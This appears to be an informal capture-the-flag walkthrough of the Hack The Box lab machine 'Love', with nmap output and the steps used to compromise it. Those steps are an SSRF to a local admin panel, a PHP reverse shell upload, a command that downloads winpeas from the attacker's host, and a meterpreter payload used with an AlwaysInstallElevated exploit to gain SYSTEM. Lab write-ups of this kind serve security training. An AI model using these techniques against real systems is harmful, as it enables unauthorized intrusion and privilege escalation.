#### NMAP 

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, FourOhFourRequest, GenericLines, JavaRMI, LANDesk-RC, LDAPBindReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|_    Host '10.10.14.172' is not allowed to connect to this MariaDB server
5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden


https not working

HTTP

love.htb = voting system
staging.love.htb = secucre file cecker

open staging.love.htb we have option to enter url lets tried with reverse shell but not working
next
we got 5000(unusual-tcp port) lets try with this http://127.0.0.1:5000 its works we got voting systems admin crends
after logged in there file upload place with this yes reverse shell..........
dont go with usual linux rev shell try windows rev shell find github
https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/minified/php_reverse_shell_mini.php 

reverse shell boom....

lets open find user.txt

powershell
dir && cd users && cd Desktop && cat user.tx

privsec

Transfer winpeas local machine to box 

in windows Invoke-WebRequest this cmd works as like as inux wget

Invoke-WebRequest http://10.10.14.172:8000/winpeas.exe -OutFile winpeas.exe

After runing winpeas 

we got AlwaysInstallElevated its enabled?

What is this? AlwaysInstallElevated?

For this purpose, the AlwaysInstallElevated policy feature is used to install an MSI package file with elevated (system) privileges. This policy is enabled in the Local Group Policy editor; directs the Windows Installer engine to use elevated permissions when it installs any program on the system. This method can make a machine vulnerable posing a high-security risk because a non-administrator user can run installations with elevated privileges and access many secure locations on the computer.

steps;;

create a meterpreter reverse pyload.exe and start reverse listerner
then send paload.exe to your victim box

then .\payload.exe trigger and ckeck lister got meterpreter shell 

now run meterpreter as background then use AlwaysInstallElevated metasploit exploit then set session 1 and set lhost tun0 exploit


boom got roottttttttt



